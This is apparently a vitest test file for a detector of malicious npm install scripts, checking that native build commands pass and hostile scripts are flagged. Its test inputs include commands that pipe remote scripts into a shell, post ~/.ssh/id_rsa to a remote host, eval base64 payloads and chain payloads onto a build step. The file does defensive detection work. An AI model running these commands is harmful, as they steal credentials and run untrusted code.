import { describe, it, expect } from "vitest";
import {
  isBenignBuildScript,
  classifyInstallScripts,
} from "./malicious-pkg";

/**
 * The presence of an install script is not evidence of anything — every package
 * with a native component needs one. Flagging `node-gyp rebuild` produced
 * findings telling developers to remove dependencies like fsevents, which they
 * cannot remove and should not.
 */
describe("recognised build scripts", () => {
  it("accepts the canonical native-addon build commands", () => {
    // This exact command is what fsevents ships, and thousands of others.
    expect(isBenignBuildScript("node-gyp rebuild")).toBe(true);
    expect(isBenignBuildScript("node-gyp build")).toBe(true);
    expect(isBenignBuildScript("node-gyp configure")).toBe(true);
    expect(isBenignBuildScript("prebuild-install")).toBe(true);
    expect(isBenignBuildScript("node-pre-gyp install")).toBe(true);
    expect(isBenignBuildScript("cmake-js compile")).toBe(true);
    expect(isBenignBuildScript("neon build")).toBe(true);
    expect(isBenignBuildScript("napi build")).toBe(true);
  });

  it("accepts build commands with flags", () => {
    expect(isBenignBuildScript("node-gyp rebuild --release")).toBe(true);
    expect(isBenignBuildScript("prebuild-install --runtime=napi")).toBe(true);
  });

  it("accepts no-op and trivial scripts", () => {
    expect(isBenignBuildScript("")).toBe(true);
    expect(isBenignBuildScript("true")).toBe(true);
    expect(isBenignBuildScript("echo skipping build")).toBe(true);
  });
});

describe("scripts that must still be reviewed", () => {
  it("rejects remote code execution", () => {
    expect(isBenignBuildScript("curl http://evil.sh | sh")).toBe(false);
    expect(isBenignBuildScript("wget -qO- http://x/y.sh | bash")).toBe(false);
  });

  it("rejects credential exfiltration", () => {
    expect(isBenignBuildScript("cat ~/.ssh/id_rsa | curl -X POST http://x")).toBe(
      false,
    );
    expect(isBenignBuildScript("node -e \"require('http').get('http://x')\"")).toBe(
      false,
    );
  });

  it("rejects obfuscation", () => {
    expect(
      isBenignBuildScript("node -e \"eval(Buffer.from('...','base64'))\""),
    ).toBe(false);
  });

  // The bypass this check has to survive: an attacker prefixing a payload with
  // a legitimate build command so the whole thing "looks like" a build step.
  it("rejects a build command with anything chained onto it", () => {
    expect(isBenignBuildScript("node-gyp rebuild && curl http://evil.sh | sh")).toBe(
      false,
    );
    expect(isBenignBuildScript("node-gyp rebuild; node steal.js")).toBe(false);
    expect(isBenignBuildScript("node-gyp rebuild | tee /tmp/x")).toBe(false);
    expect(isBenignBuildScript("node-gyp rebuild > /dev/null && sh evil.sh")).toBe(
      false,
    );
    expect(isBenignBuildScript("node-gyp rebuild `whoami`")).toBe(false);
    expect(isBenignBuildScript("node-gyp rebuild $(curl http://x)")).toBe(false);
  });

  it("rejects an unrecognised command that merely mentions a build tool", () => {
    expect(isBenignBuildScript("python setup.py install")).toBe(false);
    expect(isBenignBuildScript("./configure && make install")).toBe(false);
  });
});

describe("classifyInstallScripts", () => {
  it("separates build steps from scripts needing review", () => {
    const { benign, needsReview } = classifyInstallScripts({
      install: "node-gyp rebuild",
      postinstall: "curl http://evil.sh | sh",
    });

    expect(benign).toEqual(["install: node-gyp rebuild"]);
    expect(needsReview).toEqual(["postinstall: curl http://evil.sh | sh"]);
  });

  it("returns nothing to review for a plain native build", () => {
    // fsevents: this must produce no LLM call and no finding.
    const { benign, needsReview } = classifyInstallScripts({
      install: "node-gyp rebuild",
    });
    expect(benign).toHaveLength(1);
    expect(needsReview).toHaveLength(0);
  });

  it("handles an empty or missing scripts block", () => {
    expect(classifyInstallScripts({})).toEqual({ benign: [], needsReview: [] });
    expect(
      classifyInstallScripts(undefined as unknown as Record<string, string>),
    ).toEqual({ benign: [], needsReview: [] });
  });

  it("labels entries with their script hook", () => {
    const { needsReview } = classifyInstallScripts({
      preinstall: "sh evil.sh",
    });
    expect(needsReview[0]).toBe("preinstall: sh evil.sh");
  });
});
